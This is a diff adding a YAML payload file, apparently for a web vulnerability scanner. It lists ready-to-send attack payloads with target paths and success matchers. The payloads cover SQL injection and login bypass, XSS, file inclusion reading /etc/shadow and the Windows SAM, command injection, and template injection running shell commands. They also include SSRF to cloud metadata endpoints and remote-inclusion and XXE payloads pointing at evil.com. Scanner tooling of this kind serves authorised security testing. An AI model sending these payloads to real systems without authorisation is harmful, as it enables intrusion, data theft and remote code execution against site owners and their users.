@@ -1,0 +1,792 @@
+vulnerabilities:
+  # SQL Injection Vulnerabilities
+  - id: "sql-injection-001"
+    name: "SQL Injection - Union Based"
+    severity: "CRITICAL"
+    type: "sql-injection"
+    description: "Union-based SQL injection vulnerability allowing data extraction"
+    payloads:
+      - "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
+      - "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
+      - "' UNION SELECT user(),database(),version(),@@version,@@datadir,@@basedir,@@tmpdir,@@hostname,@@port,@@socket--"
+      - "' UNION SELECT table_name,column_name,data_type,is_nullable,column_default,extra,privileges,column_comment,NULL,NULL FROM information_schema.columns--"
+      - "' UNION SELECT schema_name,default_character_set_name,default_collation_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.schemata--"
+    paths:
+      - "/search"
+      - "/login"
+      - "/product"
+      - "/user"
+      - "/admin"
+    methods: ["GET", "POST"]
+    headers:
+      "Content-Type": "application/x-www-form-urlencoded"
+    matcher:
+      - "mysql"
+      - "syntax error"
+      - "ORA-"
+      - "PostgreSQL"
+
+  - id: "sql-injection-002"
+    name: "SQL Injection - Boolean Based Blind"
+    severity: "HIGH"
+    type: "sql-injection"
+    description: "Boolean-based blind SQL injection vulnerability"
+    payloads:
+      - "' AND 1=1--"
+      - "' AND 1=2--"
+      - "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
+      - "' AND (SELECT LENGTH(database()))>0--"
+      - "' AND (SELECT SUBSTRING(@@version,1,1))='5'--"
+      - "' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>64--"
+      - "' AND (SELECT COUNT(*) FROM mysql.user)>0--"
+      - "' AND SLEEP(5)--"
+    paths:
+      - "/search"
+      - "/login"
+      - "/product"
+      - "/category"
+    methods: ["GET", "POST"]
+    matcher:
+      - "true"
+      - "false"
+      - "delay"
+
+  - id: "sql-injection-003"
+    name: "SQL Injection - Time Based Blind"
+    severity: "HIGH"
+    type: "sql-injection"
+    description: "Time-based blind SQL injection vulnerability"
+    payloads:
+      - "'; WAITFOR DELAY '00:00:05'--"
+      - "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+      - "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+      - "'; SELECT pg_sleep(5)--"
+      - "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND SLEEP(5))--"
+      - "' UNION SELECT SLEEP(5),NULL,NULL,NULL--"
+    paths:
+      - "/search"
+      - "/login"
+      - "/api/user"
+    methods: ["GET", "POST"]
+    matcher:
+      - "delay"
+      - "timeout"
+
+  # Cross-Site Scripting (XSS) Vulnerabilities
+  - id: "xss-001"
+    name: "Reflected XSS"
+    severity: "HIGH"
+    type: "xss"
+    description: "Reflected Cross-Site Scripting vulnerability"
+    payloads:
+      - "<script>alert('XSS')</script>"
+      - "<img src=x onerror=alert('XSS')>"
+      - "<svg onload=alert('XSS')>"
+      - "javascript:alert('XSS')"
+      - "<iframe src=javascript:alert('XSS')></iframe>"
+      - "<body onload=alert('XSS')>"
+      - "<input onfocus=alert('XSS') autofocus>"
+      - "<select onfocus=alert('XSS') autofocus>"
+      - "<textarea onfocus=alert('XSS') autofocus>"
+      - "<keygen onfocus=alert('XSS') autofocus>"
+      - "<video><source onerror=alert('XSS')>"
+      - "<audio src=x onerror=alert('XSS')>"
+    paths:
+      - "/search"
+      - "/comment"
+      - "/profile"
+      - "/contact"
+    methods: ["GET", "POST"]
+    matcher:
+      - "<script>"
+      - "alert("
+      - "javascript:"
+
+  - id: "xss-002"
+    name: "Stored XSS"
+    severity: "CRITICAL"
+    type: "xss"
+    description: "Stored Cross-Site Scripting vulnerability"
+    payloads:
+      - "<script>alert('Stored XSS')</script>"
+      - "<img src=x onerror=alert('Stored XSS')>"
+      - "<svg onload=alert('Stored XSS')>"
+      - "<iframe src=javascript:alert('Stored XSS')></iframe>"
+      - "<object data=javascript:alert('Stored XSS')>"
+      - "<embed src=javascript:alert('Stored XSS')>"
+      - "<link rel=stylesheet href=javascript:alert('Stored XSS')>"
+      - "<style>@import'javascript:alert(\"Stored XSS\")';</style>"
+    paths:
+      - "/comment"
+      - "/profile"
+      - "/message"
+      - "/post"
+    methods: ["POST", "PUT"]
+    matcher:
+      - "<script>"
+      - "alert("
+      - "javascript:"
+
+  # Local File Inclusion (LFI) Vulnerabilities
+  - id: "lfi-001"
+    name: "Local File Inclusion - Linux"
+    severity: "CRITICAL"
+    type: "lfi"
+    description: "Local File Inclusion vulnerability targeting Linux systems"
+    payloads:
+      - "../../../../etc/passwd"
+      - "../../../etc/passwd"
+      - "../../etc/passwd"
+      - "../etc/passwd"
+      - "/etc/passwd"
+      - "../../../../etc/shadow"
+      - "../../../../etc/hosts"
+      - "../../../../etc/hostname"
+      - "../../../../etc/issue"
+      - "../../../../proc/version"
+      - "../../../../proc/self/environ"
+      - "../../../../proc/self/cmdline"
+      - "../../../../var/log/apache2/access.log"
+      - "../../../../var/log/apache2/error.log"
+      - "../../../../var/www/html/config.php"
+    paths:
+      - "/file"
+      - "/include"
+      - "/page"
+      - "/template"
+      - "/view"
+    methods: ["GET", "POST"]
+    matcher:
+      - "root:"
+      - "daemon:"
+      - "bin:"
+      - "sys:"
+
+  - id: "lfi-002"
+    name: "Local File Inclusion - Windows"
+    severity: "CRITICAL"
+    type: "lfi"
+    description: "Local File Inclusion vulnerability targeting Windows systems"
+    payloads:
+      - "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+      - "..\\..\\..\\..\\windows\\system32\\config\\sam"
+      - "..\\..\\..\\..\\windows\\system32\\config\\system"
+      - "..\\..\\..\\..\\windows\\win.ini"
+      - "..\\..\\..\\..\\windows\\system.ini"
+      - "..\\..\\..\\..\\boot.ini"
+      - "C:\\windows\\system32\\drivers\\etc\\hosts"
+      - "C:\\windows\\win.ini"
+      - "C:\\windows\\system.ini"
+      - "C:\\boot.ini"
+    paths:
+      - "/file"
+      - "/include"
+      - "/page"
+      - "/template"
+    methods: ["GET", "POST"]
+    matcher:
+      - "# Copyright"
+      - "[boot loader]"
+      - "[fonts]"
+      - "[extensions]"
+
+  # Remote File Inclusion (RFI) Vulnerabilities
+  - id: "rfi-001"
+    name: "Remote File Inclusion"
+    severity: "CRITICAL"
+    type: "rfi"
+    description: "Remote File Inclusion vulnerability"
+    payloads:
+      - "http://evil.com/shell.txt"
+      - "https://pastebin.com/raw/malicious"
+      - "ftp://evil.com/shell.php"
+      - "http://127.0.0.1/shell.php"
+      - "https://raw.githubusercontent.com/user/repo/main/shell.php"
+    paths:
+      - "/include"
+      - "/page"
+      - "/template"
+      - "/file"
+    methods: ["GET", "POST"]
+    matcher:
+      - "include"
+      - "require"
+      - "fopen"
+
+  # Command Injection Vulnerabilities
+  - id: "command-injection-001"
+    name: "Command Injection - Linux"
+    severity: "CRITICAL"
+    type: "command-injection"
+    description: "Command injection vulnerability on Linux systems"
+    payloads:
+      - "; ls -la"
+      - "| ls -la"
+      - "&& ls -la"
+      - "|| ls -la"
+      - "; cat /etc/passwd"
+      - "| cat /etc/passwd"
+      - "&& cat /etc/passwd"
+      - "; whoami"
+      - "| whoami"
+      - "&& whoami"
+      - "; id"
+      - "| id"
+      - "&& id"
+      - "; uname -a"
+      - "| uname -a"
+      - "&& uname -a"
+    paths:
+      - "/ping"
+      - "/cmd"
+      - "/exec"
+      - "/system"
+    methods: ["GET", "POST"]
+    matcher:
+      - "total"
+      - "root:"
+      - "uid="
+      - "gid="
+      - "Linux"
+
+  - id: "command-injection-002"
+    name: "Command Injection - Windows"
+    severity: "CRITICAL"
+    type: "command-injection"
+    description: "Command injection vulnerability on Windows systems"
+    payloads:
+      - "& dir"
+      - "| dir"
+      - "&& dir"
+      - "|| dir"
+      - "& type C:\\windows\\win.ini"
+      - "| type C:\\windows\\win.ini"
+      - "&& type C:\\windows\\win.ini"
+      - "& whoami"
+      - "| whoami"
+      - "&& whoami"
+      - "& systeminfo"
+      - "| systeminfo"
+      - "&& systeminfo"
+    paths:
+      - "/ping"
+      - "/cmd"
+      - "/exec"
+      - "/system"
+    methods: ["GET", "POST"]
+    matcher:
+      - "Directory of"
+      - "[fonts]"
+      - "Host Name:"
+      - "OS Name:"
+
+  # Server-Side Template Injection (SSTI) Vulnerabilities
+  - id: "ssti-001"
+    name: "Server-Side Template Injection - Jinja2"
+    severity: "CRITICAL"
+    type: "ssti"
+    description: "Server-Side Template Injection in Jinja2 templates"
+    payloads:
+      - "{{7*7}}"
+      - "{{config}}"
+      - "{{config.items()}}"
+      - "{{''.__class__.__mro__[2].__subclasses__()}}"
+      - "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+      - "{{lipsum.__globals__['os'].popen('id').read()}}"
+      - "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+      - "{{joiner.__init__.__globals__.os.popen('id').read()}}"
+      - "{{namespace.__init__.__globals__.os.popen('id').read()}}"
+    paths:
+      - "/template"
+      - "/render"
+      - "/preview"
+      - "/email"
+    methods: ["GET", "POST"]
+    matcher:
+      - "49"
+      - "uid="
+      - "gid="
+
+  - id: "ssti-002"
+    name: "Server-Side Template Injection - Twig"
+    severity: "CRITICAL"
+    type: "ssti"
+    description: "Server-Side Template Injection in Twig templates"
+    payloads:
+      - "{{7*7}}"
+      - "{{_self.env.registerUndefinedFilterCallback('exec')}}"
+      - "{{_self.env.getFilter('exec')}}"
+      - "{{['id']|filter('system')}}"
+      - "{{['cat /etc/passwd']|filter('system')}}"
+      - "{{_self.env.enableDebug()}}"
+      - "{{_self.env.isDebug()}}"
+    paths:
+      - "/template"
+      - "/render"
+      - "/preview"
+    methods: ["GET", "POST"]
+    matcher:
+      - "49"
+      - "root:"
+
+  # XML External Entity (XXE) Vulnerabilities
+  - id: "xxe-001"
+    name: "XML External Entity Injection"
+    severity: "HIGH"
+    type: "xxe"
+    description: "XML External Entity injection vulnerability"
+    payloads:
+      - "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+      - "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>"
+      - "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"
+      - "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/evil.dtd\">]><foo>&xxe;</foo>"
+      - "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]><foo></foo>"
+    paths:
+      - "/xml"
+      - "/upload"
+      - "/api/xml"
+      - "/parse"
+    methods: ["POST", "PUT"]
+    headers:
+      "Content-Type": "application/xml"
+    matcher:
+      - "root:"
+      - "daemon:"
+      - "[fonts]"
+
+  # Cross-Site Request Forgery (CSRF) Vulnerabilities
+  - id: "csrf-001"
+    name: "Cross-Site Request Forgery"
+    severity: "MEDIUM"
+    type: "csrf"
+    description: "Cross-Site Request Forgery vulnerability"
+    payloads:
+      - "<form action=\"/admin/delete\" method=\"POST\"><input type=\"hidden\" name=\"id\" value=\"1\"><input type=\"submit\" value=\"Delete\"></form>"
+      - "<img src=\"/admin/delete?id=1\">"
+      - "<script>fetch('/admin/delete', {method: 'POST', body: 'id=1'})</script>"
+    paths:
+      - "/admin"
+      - "/delete"
+      - "/update"
+      - "/transfer"
+    methods: ["POST", "PUT", "DELETE"]
+    matcher:
+      - "deleted"
+      - "updated"
+      - "transferred"
+
+  # Insecure Direct Object Reference (IDOR) Vulnerabilities
+  - id: "idor-001"
+    name: "Insecure Direct Object Reference"
+    severity: "HIGH"
+    type: "idor"
+    description: "Insecure Direct Object Reference vulnerability"
+    payloads:
+      - "1"
+      - "2"
+      - "3"
+      - "100"
+      - "999"
+      - "admin"
+      - "root"
+      - "../1"
+      - "../../1"
+    paths:
+      - "/user"
+      - "/profile"
+      - "/document"
+      - "/file"
+      - "/admin"
+    methods: ["GET", "POST"]
+    matcher:
+      - "user"
+      - "profile"
+      - "document"
+      - "admin"
+
+  # File Upload Vulnerabilities
+  - id: "file-upload-001"
+    name: "Malicious File Upload"
+    severity: "CRITICAL"
+    type: "file-upload"
+    description: "Malicious file upload vulnerability"
+    payloads:
+      - "shell.php"
+      - "shell.jsp"
+      - "shell.asp"
+      - "shell.aspx"
+      - "shell.py"
+      - "shell.pl"
+      - "shell.rb"
+      - "shell.php.jpg"
+      - "shell.php%00.jpg"
+      - "shell.php;.jpg"
+    paths:
+      - "/upload"
+      - "/file"
+      - "/avatar"
+      - "/document"
+    methods: ["POST", "PUT"]
+    headers:
+      "Content-Type": "multipart/form-data"
+    matcher:
+      - "uploaded"
+      - "success"
+      - "saved"
+
+  # Directory Traversal Vulnerabilities
+  - id: "directory-traversal-001"
+    name: "Directory Traversal"
+    severity: "HIGH"
+    type: "directory-traversal"
+    description: "Directory traversal vulnerability"
+    payloads:
+      - "../"
+      - "../../"
+      - "../../../"
+      - "../../../../"
+      - "../../../../../"
+      - "..%2F"
+      - "..%2F..%2F"
+      - "..%2F..%2F..%2F"
+      - "..%5C"
+      - "..%5C..%5C"
+      - "..%5C..%5C..%5C"
+      - "%2e%2e%2f"
+      - "%2e%2e%5c"
+    paths:
+      - "/file"
+      - "/download"
+      - "/view"
+      - "/include"
+    methods: ["GET", "POST"]
+    matcher:
+      - "Directory"
+      - "Index of"
+      - "Parent Directory"
+
+  # NoSQL Injection Vulnerabilities
+  - id: "nosql-injection-001"
+    name: "NoSQL Injection - MongoDB"
+    severity: "HIGH"
+    type: "nosql-injection"
+    description: "NoSQL injection vulnerability in MongoDB"
+    payloads:
+      - "true, $where: '1 == 1'"
+      - "$where: 'this.password.match(/.*/)'"
+      - "$where: 'this.username.match(/.*/)'"
+      - "$ne: null"
+      - "$regex: '.*'"
+      - "$gt: ''"
+      - "$lt: 'z'"
+      - "$exists: true"
+      - "$in: ['admin', 'user', 'guest']"
+    paths:
+      - "/login"
+      - "/search"
+      - "/user"
+      - "/api"
+    methods: ["GET", "POST"]
+    matcher:
+      - "user"
+      - "admin"
+      - "password"
+
+  # LDAP Injection Vulnerabilities
+  - id: "ldap-injection-001"
+    name: "LDAP Injection"
+    severity: "HIGH"
+    type: "ldap-injection"
+    description: "LDAP injection vulnerability"
+    payloads:
+      - "*"
+      - "*)(uid=*"
+      - "*)(|(uid=*"
+      - "*)(&(uid=*"
+      - "*))%00"
+      - "admin)(&(password=*))"
+      - "admin))(|(uid=*"
+    paths:
+      - "/login"
+      - "/search"
+      - "/user"
+      - "/auth"
+    methods: ["GET", "POST"]
+    matcher:
+      - "ldap"
+      - "distinguished"
+      - "objectClass"
+
+  # HTTP Header Injection Vulnerabilities
+  - id: "header-injection-001"
+    name: "HTTP Header Injection"
+    severity: "MEDIUM"
+    type: "header-injection"
+    description: "HTTP header injection vulnerability"
+    payloads:
+      - "test\r\nSet-Cookie: admin=true"
+      - "test\r\nLocation: http://evil.com"
+      - "test\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>"
+      - "test%0d%0aSet-Cookie: admin=true"
+      - "test%0d%0aLocation: http://evil.com"
+    paths:
+      - "/redirect"
+      - "/header"
+      - "/cookie"
+    methods: ["GET", "POST"]
+    headers:
+      "User-Agent": "Mozilla/5.0"
+    matcher:
+      - "Set-Cookie"
+      - "Location"
+      - "Content-Length"
+
+  # Server-Side Request Forgery (SSRF) Vulnerabilities
+  - id: "ssrf-001"
+    name: "Server-Side Request Forgery"
+    severity: "HIGH"
+    type: "ssrf"
+    description: "Server-Side Request Forgery vulnerability"
+    payloads:
+      - "http://127.0.0.1:22"
+      - "http://127.0.0.1:80"
+      - "http://127.0.0.1:443"
+      - "http://127.0.0.1:3306"
+      - "http://127.0.0.1:5432"
+      - "http://127.0.0.1:6379"
+      - "http://localhost:22"
+      - "http://localhost:80"
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://metadata.google.internal/computeMetadata/v1/"
+      - "file:///etc/passwd"
+      - "file:///c:/windows/win.ini"
+      - "gopher://127.0.0.1:22/_test"
+      - "dict://127.0.0.1:22/test"
+    paths:
+      - "/fetch"
+      - "/proxy"
+      - "/url"
+      - "/webhook"
+      - "/image"
+    methods: ["GET", "POST"]
+    matcher:
+      - "SSH"
+      - "HTTP"
+      - "root:"
+      - "[fonts]"
+      - "metadata"
+
+  # Business Logic Vulnerabilities
+  - id: "business-logic-001"
+    name: "Price Manipulation"
+    severity: "HIGH"
+    type: "business-logic"
+    description: "Price manipulation vulnerability"
+    payloads:
+      - "-1"
+      - "0"
+      - "0.01"
+      - "-100"
+      - "999999999"
+      - "null"
+      - "undefined"
+    paths:
+      - "/cart"
+      - "/checkout"
+      - "/price"
+      - "/order"
+    methods: ["POST", "PUT"]
+    matcher:
+      - "total"
+      - "price"
+      - "amount"
+
+  # Authentication Bypass Vulnerabilities
+  - id: "auth-bypass-001"
+    name: "Authentication Bypass"
+    severity: "CRITICAL"
+    type: "auth-bypass"
+    description: "Authentication bypass vulnerability"
+    payloads:
+      - "admin' --"
+      - "admin' #"
+      - "admin'/*"
+      - "' or 1=1--"
+      - "' or 'a'='a"
+      - "') or ('a'='a"
+      - "' or 1=1#"
+      - "admin' or '1'='1"
+      - "admin') or ('1'='1'--"
+      - "admin') or ('1'='1'#"
+    paths:
+      - "/login"
+      - "/auth"
+      - "/signin"
+      - "/admin"
+    methods: ["POST"]
+    matcher:
+      - "welcome"
+      - "dashboard"
+      - "admin"
+      - "success"
+
+  # Session Management Vulnerabilities
+  - id: "session-001"
+    name: "Session Fixation"
+    severity: "MEDIUM"
+    type: "session"
+    description: "Session fixation vulnerability"
+    payloads:
+      - "PHPSESSID=attacker_session"
+      - "JSESSIONID=attacker_session"
+      - "ASP.NET_SessionId=attacker_session"
+      - "session_id=attacker_session"
+    paths:
+      - "/login"
+      - "/auth"
+      - "/session"
+    methods: ["GET", "POST"]
+    headers:
+      "Cookie": "session_id=test"
+    matcher:
+      - "session"
+      - "logged"
+      - "authenticated"
+
+  # Information Disclosure Vulnerabilities
+  - id: "info-disclosure-001"
+    name: "Information Disclosure"
+    severity: "MEDIUM"
+    type: "info-disclosure"
+    description: "Information disclosure vulnerability"
+    payloads:
+      - ".git/config"
+      - ".svn/entries"
+      - ".env"
+      - "config.php"
+      - "database.yml"
+      - "web.config"
+      - "app.config"
+      - "settings.py"
+      - "config.json"
+      - "package.json"
+      - "composer.json"
+      - "Dockerfile"
+      - ".htaccess"
+      - "robots.txt"
+      - "sitemap.xml"
+    paths:
+      - "/"
+      - "/config"
+      - "/admin"
+      - "/backup"
+    methods: ["GET"]
+    matcher:
+      - "repositoryformatversion"
+      - "password"
+      - "secret"
+      - "key"
+      - "token"
+
+  # Weak Cryptography Vulnerabilities
+  - id: "weak-crypto-001"
+    name: "Weak Cryptographic Implementation"
+    severity: "MEDIUM"
+    type: "weak-crypto"
+    description: "Weak cryptographic implementation"
+    payloads:
+      - "MD5"
+      - "SHA1"
+      - "DES"
+      - "3DES"
+      - "RC4"
+      - "ECB"
+      - "base64"
+    paths:
+      - "/hash"
+      - "/encrypt"
+      - "/crypto"
+      - "/password"
+    methods: ["GET", "POST"]
+    matcher:
+      - "md5"
+      - "sha1"
+      - "des"
+      - "rc4"
+      - "ecb"
+
+  # API Security Vulnerabilities
+  - id: "api-001"
+    name: "API Enumeration"
+    severity: "MEDIUM"
+    type: "api"
+    description: "API enumeration vulnerability"
+    payloads:
+      - "/api/v1/users"
+      - "/api/v2/users"
+      - "/api/users"
+      - "/api/admin"
+      - "/api/config"
+      - "/api/debug"
+      - "/api/test"
+      - "/api/internal"
+      - "/graphql"
+      - "/swagger"
+      - "/openapi.json"
+      - "/api-docs"
+    paths:
+      - "/api"
+      - "/v1"
+      - "/v2"
+      - "/rest"
+    methods: ["GET", "POST", "PUT", "DELETE"]
+    matcher:
+      - "users"
+      - "admin"
+      - "config"
+      - "swagger"
+      - "graphql"
+
+  # Race Condition Vulnerabilities
+  - id: "race-condition-001"
+    name: "Race Condition"
+    severity: "MEDIUM"
+    type: "race-condition"
+    description: "Race condition vulnerability"
+    payloads:
+      - "concurrent_request_1"
+      - "concurrent_request_2"
+      - "concurrent_request_3"
+    paths:
+      - "/transfer"
+      - "/withdraw"
+      - "/purchase"
+      - "/vote"
+    methods: ["POST"]
+    matcher:
+      - "success"
+      - "completed"
+      - "processed"
+
+  # Deserialization Vulnerabilities
+  - id: "deserialization-001"
+    name: "Insecure Deserialization"
+    severity: "CRITICAL"
+    type: "deserialization"
+    description: "Insecure deserialization vulnerability"
+    payloads:
+      - "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}"
+      - "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABHRlc3R4"
+      - "aced0005737200116a6176612e7574696c2e486173684d61700507daa1c41f61e103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017400047465737474000474657374"
+    paths:
+      - "/deserialize"
+      - "/unserialize"
+      - "/object"
+      - "/session"
+    methods: ["POST", "PUT"]
+    headers:
+      "Content-Type": "application/octet-stream"
+    matcher:
+      - "object"
+      - "serialized"
+      - "unserialized"
